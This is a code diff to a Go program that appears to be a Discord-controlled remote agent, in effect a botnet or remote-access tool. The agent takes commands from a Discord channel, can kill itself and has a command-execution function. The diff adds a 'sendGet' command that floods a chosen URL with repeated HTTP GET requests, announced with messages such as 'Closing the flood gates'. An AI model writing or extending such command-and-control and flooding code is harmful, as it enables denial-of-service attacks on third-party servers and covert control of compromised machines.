@@ -9,6 +9,7 @@ import (
 	"os/signal"
 	"regexp"
 	"runtime"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -147,7 +148,31 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 	if !message.Author.Bot {
 		if message.ChannelID == channelID.ID {
 			if message.Content == "ping" {
-				dg.ChannelMessageSend(message.ChannelID, "I'm alive bruv")
+				dg.ChannelMessageSend(message.ChannelID, "↑")
+			} else if strings.HasPrefix(message.Content, "sendGet") {
+				commandBreakdown := strings.Fields(message.Content)
+				if strings.Contains(commandBreakdown[1], "http") && len(commandBreakdown) == 3 { // Program crashes
+					itterations, err := strconv.Atoi(commandBreakdown[2])
+					if err != nil {
+						os.Exit(1)
+					}
+					for i := 0; i < itterations; i++ {
+						code := util.SendGET(commandBreakdown[1])
+						if code != 200 {
+							dg.ChannelMessageSend(message.ChannelID, "[-]Exiting mode. Server returned: "+strconv.Itoa(code))
+							break
+						}
+						if message.ChannelID == channelID.ID {
+							if message.Content == "stop" {
+								dg.ChannelMessageSend(message.ChannelID, "[+]Closing the flood gates ...")
+								break
+							}
+						}
+						dg.ChannelMessageSend(message.ChannelID, "[*]Get Req Sent ...")
+					}
+				} else {
+					dg.ChannelMessageSend(message.ChannelID, "[-]Usage: http[:]//urltohit[.]xyz number of times to GET")
+				}
 			} else if message.Content == "kill" {
 				dg.ChannelDelete(channelID.ID)
 				os.Exit(0)
@@ -254,7 +279,7 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 }
 
 func heartBeat(dg *discordgo.Session) {
-	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("!heartbeat %v", newAgent.IP))
+	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("❤️"))
 }
 
 func executeCommand(command string) string {
